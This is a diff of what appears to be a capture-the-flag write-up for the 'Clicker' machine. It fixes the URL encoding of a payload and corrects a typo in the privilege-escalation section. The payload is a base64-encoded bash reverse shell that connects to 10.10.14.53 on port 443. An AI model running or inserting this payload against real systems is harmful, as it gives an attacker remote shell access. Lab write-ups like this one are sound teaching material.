@@ -379,7 +379,7 @@ echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ== | base
 Because we will be using this payload in a URL its best to URL encode all the spaces as well leaving us with the following resulting payload
 
 ```
-echo%20L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ==|%20base64%20--decode|%20bash
+echo%20L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ==|%20base64%20--decode%20|%20bash
 
 ```
 
@@ -569,7 +569,7 @@ ssh -i id_rsa jack@clicker.htb
 ```
 ## Privilege Escalation
 
-Then after logging in i ran **Sudo -l** as a sanity check and we could run the following  tje /opt/monitor.sh script with sudo
+Then after logging in i ran **Sudo -l** as a sanity check and we could run the following  the /opt/monitor.sh script with sudo
 
 
 ![Can run script as root](/assets/img/Clicker/Clicker_10.png)
